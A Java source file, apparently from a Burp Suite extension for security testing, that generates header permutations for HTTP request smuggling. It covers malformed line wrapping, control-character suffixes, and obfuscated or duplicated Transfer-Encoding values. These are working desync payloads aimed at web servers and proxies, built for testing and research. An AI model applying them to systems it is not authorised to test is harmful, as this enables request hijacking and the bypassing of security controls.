package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;

public class DesyncBox {

    static ArrayList<String> supportedPermutations = new ArrayList<>();
    static final String PERMUTE_PREFIX = "permute: ";

    DesyncBox () {
        // core techniques
        registerPermutation("vanilla");
        registerPermutation("badwrap");
        registerPermutation("space1");
        registerPermutation("badsetupLF");
        registerPermutation("gareth1");

        // niche techniques
        // registerPermutation("underjoin1");

        //registerPermutation("underscore2");
        registerPermutation("nameprefix1");
        registerPermutation("valueprefix1");
        registerPermutation("nospace1");
        registerPermutation("linewrapped1");
        registerPermutation("badsetupCR");
        registerPermutation("vertwrap");
        registerPermutation("tabwrap");
        registerPermutation("multiCase");
        registerPermutation("0dwrap");
        registerPermutation("0dspam");
        registerPermutation("spaceFF");
        registerPermutation("unispace");
        registerPermutation("connection");
        registerPermutation("spjunk");
        registerPermutation("backslash");

        for(int i: DesyncBox.getSpecialChars()) {
            registerPermutation("spacefix1:"+i);
        }

    }

    static void registerPermutation(String permutation) {
        supportedPermutations.add(permutation);
        Utilities.globalSettings.registerSetting(PERMUTE_PREFIX+permutation, true);
    }

    static byte[] applyDesync(byte[] request, String header, String technique) {
        String headerValue = Utilities.getHeader(request, header);
        header = header + ": ";
        String permuted = null;
        byte[] transformed = request;
        
        
        switch (technique) {
            case "underjoin1":
                permuted = header.replace("-", "_");
                break;
            case "spacejoin1":
                permuted = header.replace("-", " ");
                break;
            case "space1":
                permuted = header.replace(":", " :");
                break;
            case "nameprefix1":
                permuted = "Foo: bar\r\n " + header;
                break;
            case "valueprefix1":
                permuted = header + " ";
                break;
            case "nospace1":
                permuted = header.replace(" ", "");
                break;
            case "linewrapped1":
                permuted = header.replace(" ", "\n ");
                break;
            case "gareth1":
                permuted = header.replace(":", "\n :");
                break;
            case "badsetupCR":
                permuted = "Foo: bar\r"+header;
                break;
            case "badsetupLF":
                permuted = "Foo: bar\n"+header;
                break;
            case "vertwrap":
                permuted = header + "\n\u000B";
                break;
            case "tabwrap":
                permuted = header + "\n\t";
                break;
            case "multiCase":
                permuted = header.toUpperCase();
                permuted = permuted.substring(0, 1).toLowerCase() + permuted.substring(1);
                break;
            case "UPPERCASE":
                permuted = header.toUpperCase();
                break;
            case "0dwrap":
                permuted = "Foo: bar\r\n\r"+header;
                break;
            case "0dspam":
                permuted = header.substring(0, 3) + "\r" + header.substring(3);
                break;
            case "connection":
                permuted = "Connection: "+header.split(": ")[0]+"\r\n"+header;
                break;
            case "spjunk":
                // Technique from "HTTP Request Smuggling in 2020"  by Amit Klein
                permuted = header.replace(":", " x:");
                break;
            case "backslash":
                // Technique from "HTTP Request Smuggling in 2020"  by Amit Klein
                permuted = header.replace("-", "\\");
                break;
        }
        

        for (int i: getSpecialChars()) {
            if (technique.equals("spacefix1:"+i)) {
                permuted = header.replace(" ", "") + (char) i;
            }
        }

        for (int i: getSpecialChars()) {
            if (technique.equals("prefix1:"+i)) {
                permuted = header + (char) i;
            }
        }

        if (permuted != null) {
            transformed = Utilities.replace(request, header, permuted);
        }

        if (technique.equals("badwrap")) {
            transformed = Utilities.replace(request, header, "X-Blah-Ignore: ");
            transformed = Utilities.replaceFirst(transformed, "\r\n", "\r\n "+header+headerValue+"\r\n");
        }

        if (technique.equals("spaceFF")) {
            try {
                ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                encoded.write(header.substring(0, header.length()-1).getBytes());
                encoded.write((byte) 0xFF);
                transformed = Utilities.replace(request, header.getBytes(), encoded.toByteArray());
            } catch (IOException e) {

            }
        }
        if (technique.equals("unispace")) {
            try {
                ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                encoded.write(header.substring(0, header.length()-1).getBytes());
                encoded.write((byte) 0xa0);
                transformed = Utilities.replace(request, header.getBytes(), encoded.toByteArray());
            } catch (IOException e) {

            }
        }

        if (header.equals("Transfer-Encoding: ")) {
            if (technique.equals("commaCow")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: chunked, identity".getBytes());
            } else if (technique.equals("cowComma")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding: identity, ".getBytes());
            } else if (technique.equals("contentEnc")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: ".getBytes(), "Content-Encoding: ".getBytes());
            } else if (technique.equals("quoted")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: \"chunked\"".getBytes());
            } else if (technique.equals("aposed")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: 'chunked'".getBytes());
            } else if (technique.equals("dualchunk")) {
                transformed = Utilities.addOrReplaceHeader(request, "Transfer-encoding", "identity");
            } else if (technique.equals("lazygrep")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: chunk");
            } else if (technique.equals("0dsuffix")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked\r");
            } else if (technique.equals("tabsuffix")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked\t");
            } else if (technique.equals("revdualchunk")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked");

            } else if (technique.equals("bodysplit")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "X: y");
                transformed = Utilities.addOrReplaceHeader(transformed, "Foo", "barzxaazz");
                transformed = Utilities.replace(transformed, "barzxaazz", "barn\n\nTransfer-Encoding: chunked");

            } else if (technique.equals("nested")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: identity, chunked, identity");
            }


            for (int i: getSpecialChars()) {
                if (technique.equals("suffix1:"+i)) {
                    transformed = Utilities.replace(request, "Transfer-Encoding: chunked".getBytes(), ("Transfer-Encoding: chunked"+(char) i).getBytes());
                }
            }

            if (technique.equals("accentTE")) {
                try {
                    ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                    encoded.write("Transf".getBytes());
                    encoded.write((byte) 0x82);
                    encoded.write("r-Encoding: ".getBytes());
                    transformed = Utilities.replace(request, "Transfer-Encoding: ".getBytes(), encoded.toByteArray());
                } catch (IOException e) {

                }
            }
            if (technique.equals("accentCH")) {
                try {
                    ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                    encoded.write("Transfer-Encoding: ch".getBytes());
                    encoded.write((byte) 0x96);
                    transformed = Utilities.replace(request, "Transfer-Encoding: chu".getBytes(), encoded.toByteArray());
                } catch (IOException e) {

                }
            }
        }
        
        if (Arrays.equals(transformed, request) && !technique.equals("vanilla")) {
            Utilities.err("Requested desync technique had no effect: "+technique);
        }

        return transformed;
    }

    static ArrayList<Integer> getSpecialChars() {
        ArrayList<Integer> chars = new ArrayList<>();
//        for (int i=0;i<32;i++) {
//            chars.add(i);
//        }

        chars.add(0); // null
        chars.add(9); // tab
        chars.add(11); // vert tab
        chars.add(12); // form feed
        chars.add(13); // \r
        chars.add(127);
        return chars;
    }
}
